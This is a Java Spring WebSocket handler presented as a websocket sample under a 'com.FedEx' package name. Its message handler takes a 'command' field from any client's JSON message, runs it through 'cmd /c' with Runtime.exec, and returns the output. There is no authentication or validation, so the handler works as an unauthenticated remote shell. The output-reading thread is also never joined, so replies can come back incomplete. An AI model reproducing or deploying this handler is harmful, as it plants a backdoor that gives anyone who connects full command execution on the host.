package com.FedEx.FedEx.controller;

import com.FedEx.FedEx.domain.Model;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.TextWebSocketHandler;

import javax.jws.WebParam;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Map;

@Component
public class TextWebSocketHandlerImpl extends TextWebSocketHandler {

    @Override
    public void afterConnectionEstablished(WebSocketSession webSocketSession) throws Exception {
        super.afterConnectionEstablished(webSocketSession);
        webSocketSession.sendMessage(new TextMessage("Hello, welcome to spring-boot-websocket-sample!"));
        System.out.println("Connection established, session ID = " + webSocketSession.getId());
    }

    @Override
    public void afterConnectionClosed(WebSocketSession webSocketSession, CloseStatus closeStatus) throws Exception {
        super.afterConnectionClosed(webSocketSession,closeStatus);
        System.out.println("Connection closed, session ID = " + webSocketSession.getId());
    }

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
        super.handleTextMessage(session,message);
        Class<Model> modelClass = Model.class;
        Model model = new Gson().fromJson(message.getPayload(), modelClass);
        Runtime runtime = Runtime.getRuntime();
        Process process = runtime.exec("cmd /c " + model.getCommand());
        StringBuilder stringBuilder = new StringBuilder();
        new Thread(new Runnable() {
            public void run() {
                BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line = null;
                try {
                    while ((line = input.readLine()) != null)
                        stringBuilder.append(line);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
        process.waitFor();
        System.out.println("input message : " + message.getPayload());
        session.sendMessage(new TextMessage(stringBuilder));
    }

    @Override
    public void handleTransportError(WebSocketSession webSocketSession, Throwable throwable) throws Exception {
        super.handleTransportError(webSocketSession,throwable);
        System.out.println("Transport error : " + throwable.getMessage());
    }

}
